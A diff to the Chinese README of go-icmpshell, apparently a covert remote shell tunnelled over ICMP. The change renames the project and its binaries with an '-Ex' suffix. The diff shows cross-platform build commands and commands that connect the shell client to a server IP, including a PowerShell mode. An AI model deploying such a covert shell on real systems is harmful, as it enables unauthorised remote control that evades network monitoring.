@@ -1,4 +1,4 @@
-# go-icmpshell
+# go-icmpshell-Ex
 
 本项目为在原仓库基础上的二次开发版本，移除了对 `gopacket/pcap` 的依赖，采用纯 Go 的 `golang.org/x/net/icmp` 实现，支持在老旧 Linux 环境下通过 `CGO_ENABLED=0` 静态编译，无需额外依赖。
 
@@ -22,18 +22,18 @@
 
 **Linux (Server/Shell):**
 ```bash
-CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -o icmpshell-server ./cmd/server
-CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -o icmpshell-shell ./cmd/shell
+CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -o icmpshell-server-Ex ./cmd/server
+CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -o icmpshell-shell-Ex ./cmd/shell
 ```
 
 **Windows (Shell):**
 ```bash
-CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build -o icmpshell-shell.exe ./cmd/shell
+CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build -o icmpshell-shell-Ex.exe ./cmd/shell
 ```
 
 **macOS (Shell):**
 ```bash
-CGO_ENABLED=0 GOOS=darwin GOARCH=arm64 go build -o icmpshell-shell-mac ./cmd/shell
+CGO_ENABLED=0 GOOS=darwin GOARCH=arm64 go build -o icmpshell-shell-mac-Ex ./cmd/shell
 ```
 
 ## 📖 使用说明
@@ -70,17 +70,17 @@ sudo setcap cap_net_raw+ep ./icmpshell-shell
 #### 常规运行
 **Linux / macOS:**
 ```bash
-sudo ./icmpshell-shell --ip <server_ip> --token <your_secret_token>
+sudo ./icmpshell-shell-Ex --ip <server_ip> --token <your_secret_token>
 ```
 
 **Windows (CMD 模式 - 默认):**
 ```powershell
-.\icmpshell-shell.exe --ip <server_ip> --token <your_secret_token>
+.\icmpshell-shell-Ex.exe --ip <server_ip> --token <your_secret_token>
 ```
 
 **Windows (PowerShell 模式):**
 ```powershell
-.\icmpshell-shell.exe --ip <server_ip> --token <your_secret_token> --powershell
+.\icmpshell-shell-Ex.exe --ip <server_ip> --token <your_secret_token> --powershell
 ```
 
 ### 参数详解
